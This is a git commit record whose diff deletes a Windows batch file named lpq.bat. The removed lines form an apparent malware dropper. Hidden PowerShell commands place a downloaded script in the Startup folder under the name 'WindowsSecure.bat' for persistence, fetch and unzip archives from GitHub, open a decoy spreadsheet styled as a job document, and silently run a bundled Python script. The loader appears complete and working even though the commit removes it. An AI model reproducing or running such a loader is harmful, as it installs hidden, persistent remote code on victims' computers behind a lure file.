fb8da42c40ba8156a710b658216bb7b026666114
ThangNguyenDepTrai <113809464+ThangNguyenDepTrai@users.noreply.github.com>
2024-06-23 20:06:59 +0700

    Delete lpq.bat

--- lpq.bat
+++
@@ -1,8 +0,0 @@
-powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/ThangNguyenDepTrai/daw/raw/main/1', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
-powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/ThangNguyenDepTrai/lpq/raw/main/hi.zip', 'C:\Users\Public\Excel.zip')"
-powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Excel.zip', 'C:/Users/Public/Excel')"
-powershell.exe -Command "Start-Process -FilePath 'C:\Users\Public\Excel\Excel\Digital Marketing Specialist.xlsx' -Verb open"
-
-powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/ThangNguyenDepTrai/lpq/raw/main/lpq.zip', 'C:\Users\Public\Document.zip')"
-powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"
-powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Document\python C:\Users\Public\Document\Lib\sim.py"
